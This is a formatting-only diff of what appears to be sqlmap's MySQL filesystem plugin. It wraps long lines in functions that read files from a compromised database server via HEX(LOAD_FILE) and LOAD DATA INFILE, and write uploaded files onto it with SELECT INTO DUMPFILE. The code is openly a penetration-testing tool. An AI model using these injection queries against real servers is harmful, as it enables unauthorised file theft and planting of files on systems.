@@ -23,6 +23,7 @@ from lib.request import inject
 from lib.techniques.union.use import unionUse
 from plugins.generic.filesystem import Filesystem as GenericFilesystem
 
+
 class Filesystem(GenericFilesystem):
     def __init__(self):
         GenericFilesystem.__init__(self)
@@ -31,7 +32,9 @@ class Filesystem(GenericFilesystem):
         infoMsg = "fetching file: '%s'" % rFile
         logger.info(infoMsg)
 
-        result = inject.getValue("HEX(LOAD_FILE('%s'))" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
+        result = inject.getValue(
+            "HEX(LOAD_FILE('%s'))" %
+            rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)
 
         return result
 
@@ -47,14 +50,24 @@ class Filesystem(GenericFilesystem):
         debugMsg = "saving hexadecimal encoded content of file '%s' " % rFile
         debugMsg += "into temporary file '%s'" % tmpFile
         logger.debug(debugMsg)
-        inject.goStacked("SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" % (rFile, tmpFile))
+        inject.goStacked(
+            "SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'" %
+            (rFile, tmpFile))
 
         debugMsg = "loading the content of hexadecimal encoded file "
         debugMsg += "'%s' into support table" % rFile
         logger.debug(debugMsg)
-        inject.goStacked("LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))
+        inject.goStacked(
+            "LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)" %
+            (tmpFile, self.fileTblName, randomStr(10), self.tblField))
 
-        length = inject.getValue("SELECT LENGTH(%s) FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+        length = inject.getValue(
+            "SELECT LENGTH(%s) FROM %s" %
+            (self.tblField,
+             self.fileTblName),
+            resumeValue=False,
+            expected=EXPECTED.INT,
+            charsetType=CHARSET_TYPE.DIGITS)
 
         if not isNumPosStrValue(length):
             warnMsg = "unable to retrieve the content of the "
@@ -74,11 +87,24 @@ class Filesystem(GenericFilesystem):
                 result = []
 
                 for i in xrange(1, length, sustrLen):
-                    chunk = inject.getValue("SELECT MID(%s, %d, %d) FROM %s" % (self.tblField, i, sustrLen, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                    chunk = inject.getValue(
+                        "SELECT MID(%s, %d, %d) FROM %s" %
+                        (self.tblField,
+                         i,
+                         sustrLen,
+                         self.fileTblName),
+                        unpack=False,
+                        resumeValue=False,
+                        charsetType=CHARSET_TYPE.HEXADECIMAL)
 
                     result.append(chunk)
             else:
-                result = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
+                result = inject.getValue(
+                    "SELECT %s FROM %s" %
+                    (self.tblField,
+                     self.fileTblName),
+                    resumeValue=False,
+                    charsetType=CHARSET_TYPE.HEXADECIMAL)
 
         return result
 
@@ -96,7 +122,8 @@ class Filesystem(GenericFilesystem):
             warnMsg += "writing process"
             logger.warn(warnMsg)
 
-        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
+        debugMsg = "exporting the %s file content to file '%s'" % (
+            fileType, dFile)
         logger.debug(debugMsg)
 
         pushValue(kb.forceWhere)
@@ -127,15 +154,19 @@ class Filesystem(GenericFilesystem):
 
         sqlQueries = self.fileToSqlQueries(fcEncodedList)
 
-        logger.debug("inserting the hexadecimal encoded file to the support table")
+        logger.debug(
+            "inserting the hexadecimal encoded file to the support table")
 
         for sqlQuery in sqlQueries:
             inject.goStacked(sqlQuery)
 
-        debugMsg = "exporting the %s file content to file '%s'" % (fileType, dFile)
+        debugMsg = "exporting the %s file content to file '%s'" % (
+            fileType, dFile)
         logger.debug(debugMsg)
 
         # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html
-        inject.goStacked("SELECT %s FROM %s INTO DUMPFILE '%s'" % (self.tblField, self.fileTblName, dFile), silent=True)
+        inject.goStacked(
+            "SELECT %s FROM %s INTO DUMPFILE '%s'" %
+            (self.tblField, self.fileTblName, dFile), silent=True)
 
         return self.askCheckWrittenFile(wFile, dFile, forceCheck)
